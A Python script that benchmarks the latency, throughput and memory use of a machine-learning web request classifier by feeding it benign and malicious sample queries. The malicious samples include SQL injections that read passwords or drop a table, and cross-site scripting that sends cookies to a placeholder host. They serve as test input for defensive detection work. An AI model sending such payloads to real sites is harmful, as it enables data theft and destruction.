"""Hardware profiling for the deployed FedZTA micro-inferencer.

Loads the same fed_model.json and the same fedzta_features transform the live
gateway uses, so the measured latency and footprint describe the deployed model
rather than a hardcoded stand-in.
"""
import json
import os
import resource
import time

import fedzta_features as F

MODEL_PATH = os.environ.get("FEDZTA_MODEL", "fed_model.json")
N_REQUESTS = 10000

BENIGN = ["GET /search?q=api/v1/sensors/temperature",
          "GET /search?q=images/logo.png",
          "GET /search?q=graphql",
          "GET /search?q=v2/accounts/12345/balance"]
MALICIOUS = ["GET /search?q=admin' OR '1'='1 UNION SELECT password FROM users--",
             "GET /search?q=<script>fetch('http://x/?c='+document.cookie)</script>",
             "GET /search?q=1; DROP TABLE sensors--",
             "GET /search?q=<img src=x onerror=alert(1)>"]


def main():
    with open(MODEL_PATH) as fh:
        m = json.load(fh)
    coef, intercept = m["coefficients"], m["intercept"]
    dim = m.get("config", {}).get("dim", len(coef))
    if dim != F.DIM:
        raise SystemExit(f"model dim {dim} != feature dim {F.DIM}")

    print(f"[+] FedZTA micro-inferencer on {os.uname().machine}")
    print(f"    feature dim {F.DIM}  (n-gram D={F.NGRAM_D}, n={F.NGRAM_N}, + 3 syntactic)")

    base = (BENIGN + MALICIOUS)
    payloads = base * (N_REQUESTS // len(base))
    expected = len(payloads) // 2            # half the distinct payloads are attacks

    F.extract(payloads[0])                   # warm up

    start = time.perf_counter()
    blocked = 0
    for p in payloads:
        if F.predict_proba(F.extract(p), coef, intercept) >= 0.5:
            blocked += 1
    total = time.perf_counter() - start

    usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    ram = usage / (1024 * 1024) if os.uname().sysname == "Darwin" else usage / 1024

    print("\n--- HARDWARE PROFILING RESULTS ---")
    print(f"Total Requests Analyzed:      {len(payloads)}")
    print(f"Requests Blocked (Anomalous): {blocked}  (expected {expected})")
    print(f"Classification correct:       {'YES' if blocked == expected else 'NO'}")
    print(f"Total Inference Time:         {total:.3f} seconds")
    print(f"Average Latency per Request:  {total / len(payloads) * 1000:.4f} ms")
    print(f"Theoretical Throughput:       {len(payloads) / total:.0f} req/s (single core)")
    print(f"Peak RAM Usage (RSS):         {ram:.2f} MB")
    print(f"Model Size:                   {(F.DIM + 1) * 4} bytes "
          f"({F.DIM} coefficients + 1 intercept, float32)")
    print("----------------------------------")


if __name__ == "__main__":
    main()
